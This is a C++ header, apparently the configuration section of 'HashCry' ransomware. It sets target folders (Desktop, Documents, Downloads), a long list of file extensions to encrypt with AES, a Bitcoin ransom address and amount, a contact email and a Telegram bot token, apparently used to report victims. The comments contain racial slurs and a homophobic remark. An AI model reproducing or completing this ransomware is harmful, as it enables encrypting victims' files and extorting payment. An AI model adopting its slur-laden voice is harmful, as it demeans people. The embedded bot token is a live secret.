#pragma once
#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include <vector>
#include <random>
#include <string>
#include <ctime>
#include <thread>
#include <filesystem>
#include <functional>
#include <algorithm>
#include <windows.h>
#include <Lmcons.h>
#include "C:\Users\skar\Desktop\cryptopp890/modes.h"
#include "C:\Users\skar\Desktop\cryptopp890/files.h"
#include "C:\Users\skar\Desktop\cryptopp890/aes.h"
#include "C:\Users\skar\Desktop\cryptopp890/sha.h"
#include "C:\Users\skar\Desktop\cryptopp890/hex.h"
#include "C:\Users\skar\Desktop\cryptopp890/ccm.h"
#include "C:\Users\skar\Desktop\cryptopp890/osrng.h"
#include "C:\Users\skar\Desktop\cryptopp890/base64.h"
#include "key_gen.h"
#include "custom_ID.h"
#include "UI.h" // for menu and imgui shit nigga (fake bsod ud)
using namespace std; // ik shit is gay but yh
using namespace CryptoPP;
namespace fs = std::filesystem; 


// -----------------------------------------------------------
// <------------------ SETTINGS HERE NIGGA ------------------>
// -----------------------------------------------------------
// Skar All Rights Reserved 2024 -> I, SKAR, TAKE NO RESPONSIBILITY OF ACTIONS MADE WITH THIS SOURCE!!!!!!

bool __DEBUG_MODE = true;

//string __path = "C:/Users/skar/Desktop/Test/";
//string __path_2 = "C:/Users/skar/Desktop/Test2/";
//string __path_3 = "C:/Users/skar/Desktop/Test3/";

const char* __telegram_bot = "bot7055190695:AAGq12bRVizWFRwuN_BFne620Bb2GzGH_5s";
std::string sUsername = __get_username();
string __path = "C:/Users/"+ sUsername +"/Desktop/";
string __path_2 = "C:/Users/" + sUsername + "/Documents/";
string __path_3 = "C:/Users/" + sUsername + "/Downloads/";

std::string __btc_addy = "1MrpVvv9YcS7Y9jb5wkw3e3UN3Gad5XwVn"; // btc addy
std::string __amount = "40"; // amount to pay in usd (ik 20 is low asf lol)
std::string __email = "emai@email.com"; // or contact

namespace __language
{
    bool russian_ru = false;
    bool french_fr = false;
    bool english_en = true;

}

//const CryptoPP::byte key[AES::DEFAULT_KEYLENGTH] = { 0xFA, 0x2B, 0x8F, 0x4C, 0xE7, 0x71, 0x2E, 0xA5, 0x6D, 0x18, 0xFA, 0x63, 0xC9, 0xB0, 0x57, 0x82 }; // encryption key (126-bit ud intil chinas quantum commupter sigs my payload)
//const CryptoPP::byte* key = __gen_key().data();
const CryptoPP::SecByteBlock key = __gen_key();
const CryptoPP::SecByteBlock __iv = __gen_iv();
std::string __unique_id = __gen_unique_id(key, __iv);

const std::vector<std::string> __extensions = { // all da extensions to encrypt 
    ".txt", ".docx", ".pdf", ".jpg", ".png", ".xlsx", ".pptx", ".mp3", ".mp4", ".avi",
    ".zip", ".rar", ".ink", ".dll", ".cpp", ".h", ".java", ".py", ".html", ".css",
    ".js", ".php", ".json", ".xml", ".log", ".bat", ".sh", ".ini", ".cfg", ".conf"
    ".sln", ".vcxproj", ".filters", ".user", ".sys", ".c", ".cs", ".hpp", ".lnk"
};

const std::vector<std::string> __extensions_dec = { // all da extensions to decrtpyt (only hashcry obv but yh)
    ".HashCry"
};